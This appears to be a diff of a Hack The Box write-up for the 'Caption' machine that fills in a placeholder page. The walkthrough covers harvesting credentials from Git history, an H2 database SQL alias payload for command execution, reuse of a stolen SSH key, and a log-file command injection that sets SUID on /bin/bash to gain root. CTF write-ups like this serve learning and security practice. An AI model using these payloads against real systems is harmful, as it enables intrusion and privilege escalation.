@@ -284,42 +284,103 @@ Next step was giving an try into those the repositories and checking their parti
 Revealing some of the `credentials` vis `Git History` which is present in the interface
 
 ![Discovering Port 8080](05.png){: width="1200" height="800" }
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <style>
-    .note-containers {
-      max-width: 600px;
-      width: 100%;
-      padding: 20px;
-      background-color: #28a745;
-      color: white;
-      border-radius: 15px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      text-align: center;
-      margin: 0 auto; /* Ensures the second container is centered */
-    }
+In the `Caption — Portal` repository , I have found a sensitive information as credentials for logging into the web portal that has been hosted in the `port number 80` , if you didn't find it heres the hink for it always check commit histories.
 
-    .note-containers p {
-      font-size: 1.2rem;
-      line-height: 1.6;
-    }
+Taking those credentials and logging in the `port number 80`
+![/etc/hosts](06.png){: width="1200" height="800" }
 
-    .note-containers strong {
-      font-weight: bold;
-      font-size: 1.3rem;
-      color: #ffdd57;
-    }
-  </style>
-</head>
-<body>
-  <div class="note-containers">
-    <p>
-      This writeup will be released <strong>soon!</strong>
-    </p>
-  </div>
-</body>
-</html>
+With the help of the creds I gained an low level access now we have to escalate the privileges of it .
+
+For further information by some random guess which I have done on one machine it is trying sql injection in interface ( Git bucket ) . I didn't get any HTTP service information so I returned to the system administration section and here I have noticed an viewer of the database which manages the H2 database and it is vulnerable to the RCE attack by using the sql . I have used an exploit which found on open internet that execute the command :
+
+```console
+CREATE ALIAS REVEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+
+java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
+
+return s.hasNext() ? s.next() : "";
+
+}$$;
+```
+![/etc/hosts](07.png){: width="1200" height="800" }
+
+After executing this, we can execute our commands.
+
+![/etc/hosts](08.png){: width="1200" height="800" }
+
+Trying SSH in the Box which can give us an information or any hint
+
+as i have went through margo's files, I found something interesting — a private SSH key! I saved it locally and used it to log into the system as margo.
+
+```console
+└─# ssh -i margo_key margo@caption.htb 
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0–119-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Mon Sep 27 6:33:10 PM UTC 2024 System load: 0.0 Processes: 233 Usage of /: 68.7% of 8.76GB Users logged in: 0 Memory usage: 17% IPv4 address for eth0: 10.129.46.159 Swap usage: 0%
+```
+After copying the key and setting the proper permissions, I was able to SSH into the machine as Margo.
+
+Now let's check for user flag.
+
+![/etc/hosts](09.png){: width="1200" height="800" }
+
+In `user.txt` I got the user flag and I am not mentioning it for the privacy of the guidelines of HTB
+
+Now let's find out root flag by the Privilege Escalation.
+
+Here I have done exploiting LogService
+
+One of the most interesting parts of this box was the Logservice repository. After cloning it from GitBucket, I saw that it contained a Thrift-based service. The key here was generating the Python client to interact with the LogService.
+
+First, I cloned the LogServicerepository:
+>git clone http://caption.htb:8080/git/root/Logservice.git
+>changing the directory to the logservice
+>cd Logservice
+
+Next, I generated the Python client code using the Thrift command:
+
+`thrift --gen py log_service.thrift`
+
+This generated the necessary Python client code to interact with the LogService.
+
+Creating a Malicious Log File
+
+To escalate our privileges, I have created a log file that, when processed by the LogService, would set the SUID bit on `/bin/bash`. This is the crucial part of the exploit.
+
+I created the malicious log file on the target machine:
+```console
+echo "127.0.0.1 \"user-agent\":\"' chmod +s /bin/bash #\"" > /tmp/malicious.log
+```
+Port Forwarding and Running the Exploit
+
+To run the Python client locally, I set up port forwarding between my local machine and the target:
+
+```console
+ssh -L 9090:127.0.0.1:9090 margo@caption.htb -N -f
+```
+Next, I used a Python script to communicate with the LogService and process the malicious log file:
+
+Running the script:
+```console
+python3 script.py
+```
+Now, the SUID bit is set on `/bin/bash`, allowing us to escalate privileges and gain a root shell.
+Checking the permissions:
+```console
+ls -la /bin/bash
+```
+Executing the bash shell with elevated privileges:
+```console
+/bin/bash -p
+```
+Finally, we are root!
+```console
+whoami
+root
+```
+Capture the Root Flag
+The last step is to navigate to the /root directory and capture the root flag:
+```console
+cat /root/root.txt
+```
+![/etc/hosts](10.png){: width="1200" height="800" }
 
